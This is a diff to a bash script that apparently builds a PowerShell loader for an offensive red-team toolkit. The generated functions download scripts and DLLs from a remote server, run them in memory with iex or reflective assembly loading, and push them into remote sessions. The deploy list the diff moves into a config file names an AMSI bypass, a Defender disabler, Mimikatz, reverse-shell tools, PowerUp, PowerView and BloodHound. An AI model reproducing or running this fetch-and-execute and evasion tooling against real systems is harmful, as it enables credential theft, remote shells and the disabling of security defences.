@@ -24,13 +24,31 @@ warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
 ### Helpers end
 
 deploy() {
+    local action
     local name="$1"
     local path="$2"
 
     case "$path" in
-        *".dll")
+        *".dll") action="Import"; name="${name}DLL" ;;
+        "scripts/"*".ps1") action="Invoke" ;;
+        *".ps1"|*".psd1"|*."psm1") action="Get" ;;
+    esac
+
+    cat <<EOF
+function $action-$name {
+EOF
+
+    case "$action" in
+        "Get")
             cat <<EOF
-function Get-${name}DLL {
+    [System.Text.Encoding]::ASCII.GetString(
+        (iwr -DisableKeepAlive -UseBasicParsing $url/$path).content
+    )
+}
+EOF
+            ;;
+        "Import")
+            cat <<EOF
     Import-Module -Assembly (
         [System.Reflection.Assembly]::Load(
             (
@@ -39,31 +57,23 @@ function Get-${name}DLL {
         )
     )
 }
-
-function Deploy-${name}DLL {
-    Param
-    (
-        [Parameter(Position = 0)]
-        [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.Runspaces.PSSession]
-        \$sess
-    )
-
-    Invoke-Command -ScriptBlock (
-        [scriptblock]::Create(
-            (Get-Command Invoke-${name}DLL).definition
+EOF
+            ;;
+        "Invoke")
+            cat <<EOF
+    iex (
+        [System.Text.Encoding]::ASCII.GetString(
+            (
+                iwr -DisableKeepAlive -UseBasicParsing $url/$path
+            ).content
         )
-    ) -Session \$sess
+    )
 }
 EOF
             ;;
-        *".ps1")
-            cat <<EOF
-function Get-$name {
-    [System.Text.Encoding]::ASCII.GetString(
-        (iwr -DisableKeepAlive -UseBasicParsing $url/$path).content
-    )
-}
+    esac
+
+    cat <<EOF
 
 function Deploy-$name {
     Param
@@ -76,13 +86,32 @@ function Deploy-$name {
 
     Invoke-Command -ScriptBlock (
         [scriptblock]::Create(
-            "iex (" + \$((Get-Command Get-$name).definition) + ")"
-        )
-    ) -Session \$sess
-}
+EOF
+
+    case "$action" in
+        "Get")
+            cat <<EOF
+            "iex (" + \$((Get-Command $action-$name).definition) + ")"
+EOF
+            ;;
+        "Import")
+            cat <<EOF
+            (Get-Command $action-$name).definition
+EOF
+            ;;
+        "Invoke")
+            cat <<EOF
+            \$((Get-Command $action-$name).definition)
 EOF
             ;;
     esac
+
+    cat <<EOF
+        )
+    ) -Session \$sess
+}
+
+EOF
 }
 
 simplehttp() {
@@ -149,8 +178,10 @@ if [[ -n $(command -v git) ]] && [[ -n $update ]]; then
     git submodule update --init --recursive
 fi
 
+config="config.default"
+[[ ! -f config ]] || config="config"
+
 # Save some variables for convenience
-admodule_dll="tools/ADModule/Microsoft.ActiveDirectory.Management.dll"
 cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
 red="\$([char]27)[41m"
@@ -163,16 +194,11 @@ if (($languagemode -match "constrained")) {
     return
 }
 
-$(deploy "ADModule" $admodule_dll)
-$(deploy "AMSIBypass" scripts/AMSIBypass.ps1)
-$(deploy "BloodHound" tools/BloodHound/Ingestors/SharpHound.ps1)
-$(deploy "ConPtyShell" tools/ConPtyShell/Invoke-ConPtyShell.ps1)
-$(deploy "DefenderDisabler" scripts/DefenderDisabler.ps1)
-$(deploy "Mimikatz" tools/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
-$(deploy "PowerCat" tools/powercat/powercat.ps1)
-$(deploy "PowerShellTcp" tools/nishang/Shells/Invoke-PowerShellTcp.ps1)
-$(deploy "PowerUp" tools/PowerSploit/Privesc/PowerUp.ps1)
-$(deploy "PowerView" tools/PowerSploit/Recon/PowerView.ps1)
+$(
+    while read -r name path; do
+        deploy "$name" "$path"
+    done <"$config"; unset name path
+)
 
 # Change prompt colors so user knows RedArmy is loaded in current
 # session
